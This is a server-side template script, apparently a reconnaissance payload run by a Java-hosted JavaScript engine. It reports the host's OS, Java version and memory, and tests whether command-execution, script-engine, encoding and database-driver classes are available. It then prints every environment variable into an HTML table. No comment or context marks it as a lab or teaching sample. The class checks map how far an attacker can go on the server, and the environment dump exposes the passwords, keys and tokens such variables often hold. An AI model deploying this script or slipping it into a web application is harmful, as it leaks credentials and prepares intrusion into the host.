<%

var html = new java.lang.StringBuilder();
html.append("<table border='1' cellpadding='5' cellspacing='0' style='font-family: Arial; border-collapse: collapse; width:100%;'>");

html.append("<tr><th colspan='2' style='background:#1d3557; color:white;'>SYSTEM & JAVA INFO</th></tr>");
html.append("<tr><td>Operating System</td><td>" + java.lang.System.getProperty("os.name") + " (" + java.lang.System.getProperty("os.version") + ")</td></tr>");
html.append("<tr><td>Java/JDK Version</td><td>" + java.lang.System.getProperty("java.version") + " (" + java.lang.System.getProperty("java.vendor") + ")</td></tr>");
html.append("<tr><td>Architecture</td><td>" + java.lang.System.getProperty("os.arch") + "</td></tr>");
html.append("<tr><td>Available Processors</td><td>" + java.lang.Runtime.getRuntime().availableProcessors() + "</td></tr>");
html.append("<tr><td>Free Memory (MB)</td><td>" + (java.lang.Runtime.getRuntime().freeMemory() / 1024 / 1024).toFixed(2) + " MB</td></tr>");

html.append("<tr><th colspan='2' style='background:#457b9d; color:white;'>CORE CLASS / COMPONENT ACCESSIBILITY</th></tr>");

var targetClasses = [
    "java.lang.ProcessBuilder",
    "javax.script.ScriptEngineManager",
    "java.util.Base64",
    "org.apache.catalina.connector.Request",
    "com.mysql.cj.jdbc.Driver",
    "org.postgresql.Driver",
    "oracle.jdbc.driver.OracleDriver"
];

for (var i = 0; i < targetClasses.length; i++) {
    var clsName = targetClasses[i];
    var status = "NOT INSTALLED";
    try {
        java.lang.Class.forName(clsName);
        status = "AVAILABLE";
    } catch (e) {
        status = "NOT AVAILABLE";
    }
    html.append("<tr><td>" + clsName + "</td><td>" + status + "</td></tr>");
}

html.append("<tr><th colspan='2' style='background:#e63946; color:white;'>ENVIRONMENT VARIABLES</th></tr>");
var env = java.lang.System.getenv();
var keys = env.keySet().toArray();
java.util.Arrays.sort(keys);

for (var j = 0; j < keys.length; j++) {
    var key = keys[j];
    var val = env.get(key);
    var safeKey = String(key).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
    var safeVal = String(val).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
    
    html.append("<tr><td>" + safeKey + "</td><td>" + safeVal + "</td></tr>");
}

html.append("</table>");

echo(html.toString());

%>